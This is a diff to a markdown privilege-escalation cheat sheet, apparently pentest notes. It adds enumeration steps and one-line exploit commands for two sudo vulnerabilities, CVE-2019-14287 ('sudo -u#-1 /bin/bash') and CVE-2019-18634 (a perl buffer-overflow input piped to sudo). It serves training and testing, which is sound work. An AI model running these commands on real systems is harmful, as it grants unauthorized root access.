@@ -163,6 +163,10 @@ ssh -i [id_rsa_file]
 ```
 # Escalation Path: Sudo
 `sudo` allows an unprivileged user to run commands as root
+- Get sudo version
+```
+sudo -V
+```
 
 ## Sudo Shell Escapes
 See [GTFOBins](https://gtfobins.github.io/) for a more exhaustive list of escapes
@@ -212,8 +216,35 @@ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 ```
 sudo LD_PRELOAD=[path-to-file]/shell.so
 ```
-## Escalation via CVE-2019-14287
+## Escalation via [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
+- Enumeration
+```
+sudo -l
 
+User hacker may run the following commands on kali:
+    (ALL, !root) /bin/bash
+```
+- Exploitation
+```
+sudo -u#-1 /bin/bash
+```
+## Escalation via [CVE-2019-18634](https://www.exploit-db.com/exploits/47995)
+- Enumeration  
+    We are looking for the `pwfeedback` flag
+```
+ $ sudo -l
+    Matching Defaults entries for millert on linux-build:
+	insults, pwfeedback, mail_badpass, mailerpath=/usr/sbin/sendmail
+
+    User millert may run the following commands on linux-build:
+	(ALL : ALL) ALL
+```
+- Exploitation  
+    This can be exploited by passing a large input to sudo via a pipe when it prompts for a password
+```
+$ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
+Password: Segmentation fault
+```
 # Escalation Path: SUID
 
 # Escalation Path: Other SUID Escalation
